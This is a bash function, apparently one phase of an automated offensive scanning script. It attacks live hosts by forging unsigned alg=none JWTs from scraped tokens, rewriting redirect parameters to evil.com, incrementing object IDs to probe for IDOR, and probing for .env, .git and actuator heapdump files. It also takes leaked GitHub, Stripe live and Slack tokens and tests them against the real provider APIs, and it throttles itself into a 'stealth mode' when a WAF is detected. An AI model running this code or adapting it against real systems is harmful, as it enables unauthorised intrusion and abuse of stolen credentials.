#======================= PHASE 12: ADVANCED VULNERABILITY TESTING =======================
# JWT algorithm confusion, OAuth misconfigs, IDOR patterns,
# API key validation, sensitive endpoint enumeration, race conditions
phase_12_advanced_vulns() {
    if phase_done "phase_12"; then return 0; fi
    phase_banner "PHASE 12: ADVANCED VULN TESTING (JWT / OAUTH / IDOR / API KEYS)"

    local START_TIME
    START_TIME=$(date +%s)
    local ADV_DIR="$OUTDIR/advanced"

    # WAF detected: stealth mode with reduced concurrency, not full skip
    local ADV_THREADS="$NUCLEI_CONCURRENCY"
    local ADV_RATE="$NUCLEI_RATE_LIMIT"
    if should_skip_noisy_phase "Phase 12 advanced testing (WAF — stealth mode)"; then
        ADV_THREADS=3
        ADV_RATE=5
        warning "Phase 12 running in stealth mode (WAF detected)"
    fi
    local ALIVE_FILE="$OUTDIR/alive/final_alive.txt"
    local PARAM_FILE="$OUTDIR/urls/parameters.txt"
    local URL_FILE="$OUTDIR/urls/all_urls.txt"

    mkdir -p "$ADV_DIR"
    : > "$ADV_DIR/jwt_findings.txt"
    : > "$ADV_DIR/oauth_findings.txt"
    : > "$ADV_DIR/idor_candidates.txt"
    : > "$ADV_DIR/apikey_hits.txt"
    : > "$ADV_DIR/race_condition.txt"
    : > "$ADV_DIR/sensitive_endpoints.txt"

    [ ! -s "$ALIVE_FILE" ] && { error "No alive hosts! Skipping phase 12."; return; }

    # ──────────────────────────────────────────────────────
    # [12.1] JWT TOKEN HUNTING + ALGORITHM CONFUSION
    # ──────────────────────────────────────────────────────
    log "[12.1] Hunting JWT tokens in responses and testing algorithm confusion..."

    local JWT_REGEX='eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{0,}'

    while IFS= read -r URL; do
        host_already_done "phase_12_jwt" "$URL" && continue
        local RESP
        RESP=$(curl_safe "$URL" 2>/dev/null || :)

        # Extract any JWTs from response body
        local FOUND_JWTS
        FOUND_JWTS=$(echo "$RESP" | grep -oE "$JWT_REGEX" | head -5)
        if [ -n "$FOUND_JWTS" ]; then
            echo "$FOUND_JWTS" | while IFS= read -r JWT; do
                local HEADER
                HEADER=$(echo "$JWT" | cut -d'.' -f1 | tr '_-' '/+' | \
                    awk '{l=length($0); pad=4-l%4; if(pad<4){for(i=0;i<pad;i++)printf "="}; print $0}' | \
                    base64 -d 2>/dev/null || :)
                local ALG
                ALG=$(echo "$HEADER" | jq -r '.alg // "unknown"' 2>/dev/null || echo "unknown")
                echo "[JWT-FOUND] URL=$URL | alg=$ALG | token=${JWT:0:60}..." >> "$ADV_DIR/jwt_findings.txt"
                # Algorithm confusion: check if alg=none is accepted
                # Proper test: rebuild header with alg=none, keep original payload, empty signature
                if [ "$ALG" != "none" ] && command -v jq &>/dev/null; then
                    local PAYLOAD_B64
                    PAYLOAD_B64=$(echo "$JWT" | cut -d'.' -f2)
                    # Build a new header with alg=none and base64url-encode it (no padding)
                    local NONE_HEADER_JSON NONE_HEADER_B64
                    NONE_HEADER_JSON=$(echo "$HEADER" | jq -c '.alg = "none"' 2>/dev/null)
                    NONE_HEADER_B64=$(printf '%s' "$NONE_HEADER_JSON" | base64 2>/dev/null | tr '+/' '-_' | tr -d '=\n')
                    local NONE_JWT="${NONE_HEADER_B64}.${PAYLOAD_B64}."
                    local NONE_STATUS
                    NONE_STATUS=$(curl_safe -H "Authorization: Bearer $NONE_JWT" \
                        -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null || echo 000)
                    if [ "$NONE_STATUS" = "200" ]; then
                        echo "[JWT-ALG-NONE] $URL accepts alg=none!" >> "$ADV_DIR/jwt_findings.txt"
                        vuln "JWT ALG=NONE ACCEPTED: $URL"
                        notify_vuln "critical" "JWT alg=none accepted: $URL"
                    fi
                fi
                # Flag weak algorithms
                case "$ALG" in
                    HS256|HS384|HS512) echo "[JWT-SYMMETRIC] $URL | $ALG — test for weak secret" >> "$ADV_DIR/jwt_findings.txt" ;;
                    none)              echo "[JWT-ALG-NONE-CLAIM] $URL — token already claims alg=none!" >> "$ADV_DIR/jwt_findings.txt"
                                       vuln "JWT ALG=NONE IN TOKEN: $URL"; notify_vuln "critical" "JWT alg=none: $URL" ;;
                esac
            done
        fi

        # Look for Set-Cookie headers containing JWT
        local COOKIE_JWT
        COOKIE_JWT=$(curl_safe -I "$URL" 2>/dev/null | grep -i 'set-cookie' | grep -oE "$JWT_REGEX" | head -3)
        if [ -n "$COOKIE_JWT" ]; then
            echo "[JWT-IN-COOKIE] $URL | ${COOKIE_JWT:0:80}..." >> "$ADV_DIR/jwt_findings.txt"
        fi

        mark_host_done "phase_12_jwt" "$URL"
    done < <(head -n "$ADV_THREADS" "$ALIVE_FILE" 2>/dev/null)

    local JWT_COUNT
    JWT_COUNT=$(wc -l < "$ADV_DIR/jwt_findings.txt")
    success "[12.1] JWT findings: $JWT_COUNT"

    # ──────────────────────────────────────────────────────
    # [12.2] OAUTH / SSO MISCONFIGURATION
    # ──────────────────────────────────────────────────────
    log "[12.2] Testing OAuth / SSO misconfigurations..."

    local OAUTH_PATHS=(
        "/oauth/authorize"
        "/oauth/token"
        "/oauth2/authorize"
        "/oauth2/token"
        "/.well-known/openid-configuration"
        "/.well-known/oauth-authorization-server"
        "/auth/callback"
        "/auth/login"
        "/sso/login"
        "/saml/sso"
        "/connect/authorize"
        "/connect/token"
        "/api/auth/callback"
    )

    while IFS= read -r URL; do
        host_already_done "phase_12_oauth" "$URL" && continue
        for OPATH in "${OAUTH_PATHS[@]}"; do
            local OURL="${URL}${OPATH}"
            local STATUS
            STATUS=$(curl_safe -o /dev/null -w "%{http_code}" "$OURL" 2>/dev/null || echo 000)
            if [ "$STATUS" = "200" ] || [ "$STATUS" = "302" ]; then
                echo "[$STATUS] $OURL" >> "$ADV_DIR/oauth_findings.txt"
            fi
        done

        # Open redirect in OAuth redirect_uri parameter
        if [ -s "$PARAM_FILE" ]; then
            grep -iE "redirect_uri|redirect_url|return_url|returnto|callback" \
                "$PARAM_FILE" 2>/dev/null | head -10 | while IFS= read -r PURL; do
                local DOMAIN_HOST
                DOMAIN_HOST=$(echo "$PURL" | grep -oE 'https?://[^/?]+' | head -1)
                local EVIL_URL
                EVIL_URL=$(echo "$PURL" | sed 's|redirect_uri=[^&]*|redirect_uri=https://evil.com|g;
                                                s|redirect_url=[^&]*|redirect_url=https://evil.com|g;
                                                s|return_url=[^&]*|return_url=https://evil.com|g')
                local FINAL_URL
                FINAL_URL=$(curl_safe -o /dev/null -w "%{url_effective}" "$EVIL_URL" 2>/dev/null || :)
                if echo "$FINAL_URL" | grep -q "evil.com"; then
                    echo "[OAUTH-OPEN-REDIRECT] $PURL → evil.com accepted" >> "$ADV_DIR/oauth_findings.txt"
                    vuln "OAUTH OPEN REDIRECT: $PURL"
                    notify_vuln "high" "OAuth open redirect: $PURL"
                fi
            done
        fi
        mark_host_done "phase_12_oauth" "$URL"
    done < <(head -20 "$ALIVE_FILE" 2>/dev/null)

    # Nuclei OAuth/SSO templates
    network_run nuclei -l "$ALIVE_FILE" \
        -tags "oauth,sso,jwt,auth" \
        -c "$NUCLEI_CONCURRENCY" \
        -rate-limit "$NUCLEI_RATE_LIMIT" \
        -o "$ADV_DIR/nuclei_auth.txt" \
        -silent 2>>"$OUTDIR/logs/errors.log" || true

    success "[12.2] OAuth findings: $(wc -l < "$ADV_DIR/oauth_findings.txt" 2>/dev/null || echo 0)"

    # ──────────────────────────────────────────────────────
    # [12.3] IDOR / BOLA CANDIDATE DETECTION
    # ──────────────────────────────────────────────────────
    log "[12.3] Identifying IDOR / BOLA candidates..."

    # Patterns that strongly suggest object IDs in URLs
    local IDOR_REGEX='/(user|account|profile|order|invoice|document|file|ticket|id|item|record|report|message|chat|payment|subscription|project|task|team|org|customer)/[0-9a-f-]{4,}'

    if [ -s "$URL_FILE" ]; then
        grep -iE "$IDOR_REGEX" "$URL_FILE" 2>/dev/null | \
            grep -vE '\.(js|css|png|jpg|gif|ico|svg|woff)' | \
            sort -u | head -200 > "$ADV_DIR/idor_candidates.txt"
    fi

    # Also catch numeric IDs in query params
    if [ -s "$PARAM_FILE" ]; then
        grep -iE '[?&](id|uid|user_id|account_id|order_id|doc_id|file_id|item_id)=[0-9]' \
            "$PARAM_FILE" 2>/dev/null | sort -u | head -200 >> "$ADV_DIR/idor_candidates.txt"
    fi

    sort -u "$ADV_DIR/idor_candidates.txt" -o "$ADV_DIR/idor_candidates.txt"
    local IDOR_COUNT
    IDOR_COUNT=$(wc -l < "$ADV_DIR/idor_candidates.txt")

    if [ "$IDOR_COUNT" -gt 0 ]; then
        # Increment ID by 1 and check for identical or different response
        head -20 "$ADV_DIR/idor_candidates.txt" | while IFS= read -r IURL; do
            local ORIG_CODE ORIG_LEN
            ORIG_CODE=$(curl_safe -o /dev/null -w "%{http_code}" "$IURL" 2>/dev/null || echo 000)
            ORIG_LEN=$(curl_safe -o /dev/null -w "%{size_download}" "$IURL" 2>/dev/null || echo 0)

            # Generate +1 ID variant using pure bash (portable, no awk gensub dependency)
            local NEXT_URL=""
            local _last_id _suffix _prefix
            _last_id=$(printf '%s' "$IURL" | grep -oE '/[0-9]+[^0-9/]*$' | grep -oE '^/[0-9]+' | tr -d '/')
            if [ -n "$_last_id" ]; then
                _suffix=$(printf '%s' "$IURL" | grep -oE '/[0-9]+[^0-9/]*$' | sed "s|^/${_last_id}||")
                _prefix="${IURL%/${_last_id}${_suffix}}"
                NEXT_URL="${_prefix}/$(( _last_id + 1 ))${_suffix}"
            fi

            if [ -n "$NEXT_URL" ] && [ "$NEXT_URL" != "$IURL" ]; then
                local NEXT_CODE NEXT_LEN
                NEXT_CODE=$(curl_safe -o /dev/null -w "%{http_code}" "$NEXT_URL" 2>/dev/null || echo 000)
                NEXT_LEN=$(curl_safe -o /dev/null -w "%{size_download}" "$NEXT_URL" 2>/dev/null || echo 0)
                if [ "$NEXT_CODE" = "200" ] && [ "$ORIG_CODE" = "200" ]; then
                    echo "[IDOR-CANDIDATE] $IURL (${ORIG_LEN}B) → $NEXT_URL (${NEXT_LEN}B)" \
                        >> "$ADV_DIR/idor_confirmed_candidates.txt" 2>/dev/null || :
                fi
            fi
        done
        notify "Phase 12: $IDOR_COUNT IDOR candidates found — manual review needed" "🔑"
    fi

    success "[12.3] IDOR candidates: $IDOR_COUNT"

    # ──────────────────────────────────────────────────────
    # [12.4] API KEY VALIDATION
    # Detect exposed API keys and validate them
    # ──────────────────────────────────────────────────────
    log "[12.4] Validating exposed API keys..."

    # Collect keys from all sources
    local KEY_SOURCES=(
        "$OUTDIR/urls/js_secrets_nuclei.txt"
        "$OUTDIR/urls/sourcemap_credentials_hits.txt"
        "$OUTDIR/urls/trufflehog.jsonl"
        "$OUTDIR/repos/secret_hits_gitleaks.jsonl"
        "$OUTDIR/repos/secret_hits_trufflehog.jsonl"
    )

    # GitHub tokens
    for SRC in "${KEY_SOURCES[@]}"; do
        [ -s "$SRC" ] || continue
        grep -oE 'ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}' "$SRC" 2>/dev/null | \
        while IFS= read -r TOKEN; do
            local RESP
            RESP=$(curl_safe -H "Authorization: token $TOKEN" \
                "https://api.github.com/user" 2>/dev/null)
            if echo "$RESP" | jq -e '.login' &>/dev/null; then
                local GH_USER
                GH_USER=$(echo "$RESP" | jq -r '.login')
                echo "[VALID-GITHUB-TOKEN] login=$GH_USER token=${TOKEN:0:15}..." >> "$ADV_DIR/apikey_hits.txt"
                vuln "VALID GITHUB TOKEN FOUND! User: $GH_USER"
                notify_vuln "critical" "Valid GitHub token: $GH_USER — from $SRC"
            fi
        done
    done

    # AWS Access Keys
    for SRC in "${KEY_SOURCES[@]}"; do
        [ -s "$SRC" ] || continue
        grep -oE 'AKIA[0-9A-Z]{16}' "$SRC" 2>/dev/null | \
        while IFS= read -r AKID; do
            echo "[AWS-ACCESS-KEY-ID] $AKID — validate manually with aws sts get-caller-identity" \
                >> "$ADV_DIR/apikey_hits.txt"
            notify_vuln "critical" "AWS Access Key ID found: ${AKID:0:8}... — needs validation"
        done
    done

    # Stripe keys
    for SRC in "${KEY_SOURCES[@]}"; do
        [ -s "$SRC" ] || continue
        grep -oE 'sk_live_[A-Za-z0-9]{24,}' "$SRC" 2>/dev/null | \
        while IFS= read -r SK; do
            local RESP
            RESP=$(curl_safe -u "${SK}:" "https://api.stripe.com/v1/balance" 2>/dev/null)
            if echo "$RESP" | jq -e '.object == "balance"' &>/dev/null; then
                echo "[VALID-STRIPE-LIVE-KEY] ${SK:0:20}..." >> "$ADV_DIR/apikey_hits.txt"
                vuln "VALID STRIPE LIVE KEY FOUND!"
                notify_vuln "critical" "Valid Stripe live key exposed"
            fi
        done
    done

    # Slack tokens
    for SRC in "${KEY_SOURCES[@]}"; do
        [ -s "$SRC" ] || continue
        grep -oE 'xox[bprs]-[A-Za-z0-9-]{24,}' "$SRC" 2>/dev/null | \
        while IFS= read -r SLACK_TOKEN; do
            local RESP
            RESP=$(curl_safe -H "Authorization: Bearer $SLACK_TOKEN" \
                "https://slack.com/api/auth.test" 2>/dev/null)
            if echo "$RESP" | jq -e '.ok == true' &>/dev/null; then
                local TEAM
                TEAM=$(echo "$RESP" | jq -r '.team // "unknown"')
                echo "[VALID-SLACK-TOKEN] team=$TEAM ${SLACK_TOKEN:0:20}..." >> "$ADV_DIR/apikey_hits.txt"
                vuln "VALID SLACK TOKEN FOUND! Team: $TEAM"
                notify_vuln "critical" "Valid Slack token — Team: $TEAM"
            fi
        done
    done

    local KEY_COUNT
    KEY_COUNT=$(wc -l < "$ADV_DIR/apikey_hits.txt" 2>/dev/null || echo 0)
    success "[12.4] API key hits: $KEY_COUNT"

    # ──────────────────────────────────────────────────────
    # [12.5] RACE CONDITION TESTING (Turbo Intruder style via parallel curl)
    # ──────────────────────────────────────────────────────
    log "[12.5] Race condition testing on sensitive endpoints..."

    local RACE_PATTERNS=(
        '/api/coupon'
        '/api/redeem'
        '/api/transfer'
        '/api/vote'
        '/api/like'
        '/api/purchase'
        '/api/withdraw'
        '/api/apply'
        '/coupon'
        '/redeem'
        '/checkout'
        '/transfer'
    )

    while IFS= read -r URL; do
        for PAT in "${RACE_PATTERNS[@]}"; do
            if echo "$URL" | grep -qi "$PAT"; then
                echo "[RACE-CANDIDATE] $URL" >> "$ADV_DIR/race_condition.txt"
            fi
        done
    done < "$URL_FILE" 2>/dev/null

    if [ -s "$ADV_DIR/race_condition.txt" ]; then
        sort -u "$ADV_DIR/race_condition.txt" -o "$ADV_DIR/race_condition.txt"
        local RACE_COUNT
        RACE_COUNT=$(wc -l < "$ADV_DIR/race_condition.txt")
        notify "Phase 12: $RACE_COUNT race condition candidates — test with Turbo Intruder" "⚡"
        success "[12.5] Race condition candidates: $RACE_COUNT"
    fi

    # ──────────────────────────────────────────────────────
    # [12.6] SENSITIVE ENDPOINT FINGERPRINTING
    # ──────────────────────────────────────────────────────
    log "[12.6] Probing sensitive/admin endpoints..."
    local SENSITIVE_PATHS=(
        "/.git/config"
        "/.git/HEAD"
        "/.env"
        "/.env.local"
        "/.env.production"
        "/config.json"
        "/config.yaml"
        "/config.yml"
        "/settings.json"
        "/app.config"
        "/application.properties"
        "/wp-config.php.bak"
        "/web.config"
        "/server-status"
        "/server-info"
        "/_profiler"
        "/phpinfo.php"
        "/info.php"
        "/__debug_bar"
        "/actuator"
        "/actuator/env"
        "/actuator/mappings"
        "/actuator/health"
        "/actuator/heapdump"
        "/actuator/threaddump"
        "/actuator/logfile"
        "/.well-known/security.txt"
        "/security.txt"
        "/.htaccess"
        "/crossdomain.xml"
        "/clientaccesspolicy.xml"
        "/robots.txt"
        "/sitemap.xml"
        "/CHANGELOG.md"
        "/CHANGELOG"
        "/README.md"
        "/Dockerfile"
        "/docker-compose.yml"
        "/.dockerignore"
        "/package.json"
        "/composer.json"
        "/Gemfile"
        "/requirements.txt"
        "/Pipfile"
    )

    while IFS= read -r URL; do
        for SPATH in "${SENSITIVE_PATHS[@]}"; do
            local SURL="${URL%/}${SPATH}"
            local STATUS CTYPE
            STATUS=$(curl_safe -o /dev/null -w "%{http_code}" "$SURL" 2>/dev/null || echo 000)
            if [ "$STATUS" = "200" ]; then
                CTYPE=$(curl_safe -o /dev/null -w "%{content_type}" "$SURL" 2>/dev/null || :)
                echo "[200] $SURL ($CTYPE)" >> "$ADV_DIR/sensitive_endpoints.txt"
                # Flag high-risk paths
                case "$SPATH" in
                    /.env*|/.git/*|/actuator/heapdump|/actuator/env|/phpinfo*)
                        vuln "SENSITIVE FILE EXPOSED: $SURL"
                        notify_vuln "high" "Sensitive file: $SURL"
                        ;;
                esac
            fi
        done
    done < <(head -n "$(( ADV_THREADS / 2 + 1 ))" "$ALIVE_FILE" 2>/dev/null)

    local SENS_COUNT
    SENS_COUNT=$(wc -l < "$ADV_DIR/sensitive_endpoints.txt" 2>/dev/null || echo 0)
    success "[12.6] Sensitive endpoints: $SENS_COUNT"

    local TOTAL_ADV=$(( JWT_COUNT + \
        $(wc -l < "$ADV_DIR/oauth_findings.txt" 2>/dev/null || echo 0) + \
        $(wc -l < "$ADV_DIR/idor_candidates.txt" 2>/dev/null || echo 0) + \
        KEY_COUNT + SENS_COUNT ))

    success "PHASE 12 DONE — Total advanced findings: $TOTAL_ADV | Time: $(( $(date +%s) - $START_TIME ))s"
    notify "Phase 12: $TOTAL_ADV advanced findings (JWT/OAuth/IDOR/APIkeys/Sensitive)" "🔑"
    mark_done "phase_12"
    echo ""
}
